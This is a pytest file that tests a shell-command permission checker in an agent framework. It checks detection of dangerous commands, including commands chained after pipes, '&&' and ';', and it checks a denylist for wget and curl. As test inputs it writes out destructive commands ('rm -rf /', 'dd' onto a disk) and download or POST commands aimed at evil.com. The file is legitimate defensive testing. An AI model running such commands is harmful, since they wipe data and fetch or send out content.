"""Unit tests for PermissionChecker.check_command() — shell injection, modes, denylist, edge cases.

These tests focus exclusively on check_command() behaviour, complementing the
broader test_permission_checker.py which covers check_tool and check_path.
"""

from __future__ import annotations

import pytest

from agent_nexus.models.permission import PermissionConfig, PermissionMode
from agent_nexus.platform.runtime.permission_checker import PermissionChecker

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _checker(**overrides) -> PermissionChecker:
    """Build a PermissionChecker with sensible defaults, overridden by *overrides*."""
    cfg = PermissionConfig(**overrides)
    return PermissionChecker(cfg)


# ======================================================================
# A) Shell injection detection (P0)
# ======================================================================


class TestShellInjectionDetection:
    """_is_dangerous_command catches dangerous shell commands with word-boundary matching."""

    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /",
            "sudo bash",
            "chmod 777 /etc/passwd",
        ],
    )
    def test_dangerous_commands_detected(self, command: str) -> None:
        assert PermissionChecker._is_dangerous_command(command) is True

    def test_dangerous_after_pipe(self) -> None:
        """Dangerous command after pipe operator is still detected."""
        assert PermissionChecker._is_dangerous_command("cat file | rm -rf /") is True

    def test_dangerous_after_and(self) -> None:
        """Dangerous command after && is still detected."""
        assert PermissionChecker._is_dangerous_command("echo hi && rm -rf /") is True

    def test_dangerous_after_semicolon(self) -> None:
        """Dangerous command after ; is still detected."""
        assert PermissionChecker._is_dangerous_command("echo hi ; rm -rf /") is True

    @pytest.mark.parametrize(
        "command",
        [
            "echo hello",
            "python3 script.py",
            "ls -la",
        ],
    )
    def test_safe_commands_not_flagged(self, command: str) -> None:
        assert PermissionChecker._is_dangerous_command(command) is False

    def test_wget_detected(self) -> None:
        assert PermissionChecker._is_dangerous_command("wget http://evil.com/payload") is True

    def test_ssh_detected(self) -> None:
        assert PermissionChecker._is_dangerous_command("ssh user@host") is True

    def test_dd_detected(self) -> None:
        assert PermissionChecker._is_dangerous_command("dd if=/dev/zero of=/dev/sda") is True


# ======================================================================
# B) check_command() mode behavior
# ======================================================================


# ======================================================================
# C) denied_commands
# ======================================================================


class TestDeniedCommands:
    """denied_commands configuration blocks matching commands."""

    def test_denied_command_wget_blocked(self) -> None:
        """wget in denied_commands blocks wget command."""
        checker = _checker(
            mode=PermissionMode.FULL_AUTO,
            denied_commands=["wget"],
        )
        d = checker.check_command("wget http://evil.com")
        assert d.allowed is False
        assert "denied pattern" in d.reason

    def test_denied_command_curl_blocked(self) -> None:
        """curl in denied_commands blocks curl command."""
        checker = _checker(
            mode=PermissionMode.FULL_AUTO,
            denied_commands=["curl"],
        )
        d = checker.check_command("curl -X POST http://evil.com")
        assert d.allowed is False
        assert "denied pattern" in d.reason

    def test_non_denied_command_allowed(self) -> None:
        """Commands not matching any denied pattern are allowed."""
        checker = _checker(
            mode=PermissionMode.FULL_AUTO,
            denied_commands=["wget", "curl"],
        )
        d = checker.check_command("echo hello")
        assert d.allowed is True
